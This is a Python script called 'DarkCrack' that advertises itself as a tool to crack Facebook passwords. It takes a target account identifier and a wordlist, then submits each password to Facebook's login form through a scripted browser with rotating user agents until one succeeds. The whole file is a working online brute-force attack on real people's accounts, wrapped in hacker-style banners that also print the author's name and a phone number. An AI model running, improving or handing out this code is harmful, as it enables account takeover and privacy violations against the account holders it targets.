#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import time
import sys
import mechanize
import cookielib
import random
import os


def flash(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)

g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'



os.system('clear')
flash(red+'AUTHOR:Nathan')
time.sleep(0.50)
flash('whatsap number:+260978535360')
time.sleep(0.50)
flash('Tools name:DarkCrack')
time.sleep(0.50)
flash('Features of Tool:Crack facebook password')
time.sleep(5)
os.system('clear')

flash(p+'━━━◆♤◆━━━◆')
flash(red+'☆ۜۜ͜͡Darkcracker')
flash(p+'◆━━━◆♤◆━━━◆')
flash(red+'''█◤◢◤◢  ◣◥◣◥█
◤◢◤◢█  █◣◥◣◥
◢◤◢██  ██◣◥◣
◥◣◥██  ██◤◢◤
◣◥◣◥█  █◤◢◤◢
█◣◥◣◥  ◤◢◤◢█
█◤◢◤◢  ◣◥◣◥█
◤◢◤◢█  █◣◥◣◥
◢◤◢██  ██◣◥◣
◥◣◥██  ██◤◢◤
◣◥◣◥█  █◤◢◤◢
█◣◥◣◥  ◤◢◤◢█''')
flash(p+'◆━━━◆♤◆━━━◆')
flash(red+'☆ۜ͜͡DarkCracker')
flash(p+'◆━━━◆♤◆━━━◆')
time.sleep(3)

email = str(raw_input('\033[1;35m'+"Enter the Facebook Username (or) Email (or) Phone Number i.e 0973626723 or miya@gmail.com or 12098300987 or sma.nonjabulo.3 : "))


passwordlist = str(raw_input(red+"Enter the wordlist name and path e.g /data/data/com.termux/files/home/wordlist.txt : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print(red+"Password does not exist in the wordlist sorry")

	
	
def brute(password):
	sys.stdout.write(p+"\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password cracked = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
    flash(p+'━━━◆♤◆━━━◆')
    flash(red+'☆ۜۜ͜͡Darkcracker')
    flash(p+'◆━━━◆♤◆━━━◆')
    flash(red+'''█◤◢◤◢  ◣◥◣◥█
◤◢◤◢█  █◣◥◣◥
◢◤◢██  ██◣◥◣
◥◣◥██  ██◤◢◤
◣◥◣◥█  █◤◢◤◢
█◣◥◣◥  ◤◢◤◢█
█◤◢◤◢  ◣◥◣◥█
◤◢◤◢█  █◣◥◣◥
◢◤◢██  ██◣◥◣
◥◣◥██  ██◤◢◤
◣◥◣◥█  █◤◢◤◢
█◣◥◣◥  ◤◢◤◢█''')
    flash(p+'◆━━━◆♤◆━━━◆')
    flash(red+'☆ۜ͜͡DarkCracker')
    flash(p+'◆━━━◆♤◆━━━◆')
total = open(passwordlist,"r")
total = total.readlines()
print (wel) 
print ('\033[1;31m'+" [*] Account to crack : {}".format(email))
print (" [*] Loaded/number of words in list :" , len(total), "passwords")
print ('\033[1;31m'+'[*] Cracking  password please wait  ...\n\n')

	
if __name__ == '__main__':
	main()


